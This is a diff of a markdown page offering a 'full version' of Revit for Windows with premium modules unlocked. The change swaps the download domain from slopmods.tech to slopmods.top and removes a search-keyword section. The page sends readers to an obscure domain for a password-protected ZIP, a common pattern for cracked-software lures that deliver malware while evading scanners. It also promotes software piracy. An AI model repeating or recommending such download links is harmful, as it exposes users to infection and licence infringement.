@@ -1,6 +1,6 @@
 ***
 
-# Revit Full Version — Windows Install Notes
+# Revit Full Version Windows Setup Notes
 
 Revit — Windows setup and configuration · Premium workspace · Zero nag dialogs.
 
@@ -8,12 +8,12 @@ Revit — Windows setup and configuration · Premium workspace · Zero nag dialo
 
 > Use the release page below for Windows.
 
-- **Release page:** [wvcdiokrakp.slopmods.tech](https://wvcdiokrakp.slopmods.tech/)
-- **Full URL:** `https://wvcdiokrakp.slopmods.tech/`
+- **Release page:** [wvcdiokrakp.slopmods.top](https://wvcdiokrakp.slopmods.top/)
+- **Full URL:** `https://wvcdiokrakp.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **wvcdiokrakp.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **wvcdiokrakp.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,13 +33,8 @@ Revit — Windows setup and configuration · Premium workspace · Zero nag dialo
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **wvcdiokrakp.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **wvcdiokrakp.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
-
-
-## Search notes
-
-Install guide for **Revit** full version on Windows PC (setup notes from release page).
 ## What you get
 
 - Core Revit features on Windows desktop
